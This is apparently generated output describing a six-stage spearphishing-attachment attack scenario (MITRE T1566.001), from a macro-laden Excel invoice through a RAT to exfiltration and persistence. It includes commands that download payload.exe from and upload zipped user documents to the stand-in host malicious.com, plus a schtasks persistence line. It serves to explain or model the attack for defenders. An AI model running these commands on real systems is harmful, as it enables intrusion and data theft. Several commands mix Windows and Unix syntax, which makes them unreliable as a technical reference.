@@ -1,0 +1,72 @@
+<output>
+Pattern Name: T1566.001 (Spearphishing Attachment)
+Scenario Overview: This attack scenario illustrates a multi-stage spearphishing attack where an attacker sends a malicious email with an attachment that, when opened, executes a payload leading to data exfiltration. The attack leverages multiple applications, including Outlook for email delivery, Excel for payload execution, and a web browser for command and control communication.
+
+Attack Flow Breakdown:
+
+**Stage 1: Initial Access via Spearphishing Email**
+- **Application Involved**: Outlook
+- **User Action**: The user receives an email with a subject line "Important Document" and an attachment named "Invoice.xlsx".
+- **Key Artifacts**: Email headers, attachment file "Invoice.xlsx".
+
+```shell
+# The user opens the email and downloads the attachment.
+# The email is sent from a spoofed address that appears legitimate.
+```
+
+**Stage 2: Execution of Malicious Payload**
+- **Application Involved**: Microsoft Excel
+- **User Action**: The user opens the "Invoice.xlsx" file, which contains a macro that executes a PowerShell command to download a malicious payload.
+- **Key Artifacts**: Excel macro code, PowerShell command.
+
+```shell
+# The macro is triggered upon opening the document.
+# PowerShell command to download the payload:
+powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://malicious.com/payload.exe' -OutFile '$env:TEMP\payload.exe'"
+# The macro may also include obfuscation techniques to evade detection.
+```
+
+**Stage 3: Payload Execution**
+- **Application Involved**: Windows Command Prompt
+- **User Action**: The macro executes the downloaded payload, which is a remote access Trojan (RAT).
+- **Key Artifacts**: Executable file "payload.exe", process creation logs.
+
+```shell
+# The payload is executed silently in the background.
+start $env:TEMP\payload.exe
+# The RAT establishes a connection to the attacker's command and control server.
+```
+
+**Stage 4: Command and Control Communication**
+- **Application Involved**: Web Browser (e.g., Chrome)
+- **User Action**: The RAT initiates a connection to the C2 server to receive commands.
+- **Key Artifacts**: Network traffic logs, DNS queries to the C2 domain.
+
+```shell
+# The RAT communicates with the C2 server using HTTP/HTTPS.
+curl -X POST -d "data=exfiltrated_data" http://malicious.com/receive
+# The C2 server may respond with further instructions or additional payloads.
+```
+
+**Stage 5: Data Exfiltration**
+- **Application Involved**: Windows Command Prompt
+- **User Action**: The RAT collects sensitive data (e.g., documents, credentials) and sends it to the C2 server.
+- **Key Artifacts**: Logs of data being sent, file paths of exfiltrated data.
+
+```shell
+# The RAT collects files and sends them to the C2 server.
+zip -r $env:TEMP\exfil_data.zip C:\Users\Victim\Documents\SensitiveData
+curl -X POST -F "file=@$env:TEMP\exfil_data.zip" http://malicious.com/upload
+```
+
+**Stage 6: Cleanup and Persistence**
+- **Application Involved**: Windows Task Scheduler
+- **User Action**: The RAT may create a scheduled task to ensure persistence on the infected machine.
+- **Key Artifacts**: Scheduled task entries, registry modifications.
+
+```shell
+# The RAT creates a scheduled task to run on startup.
+schtasks /create /tn "MaliciousTask" /tr "$env:TEMP\payload.exe" /sc onlogon /rl highest
+```
+
+</output>
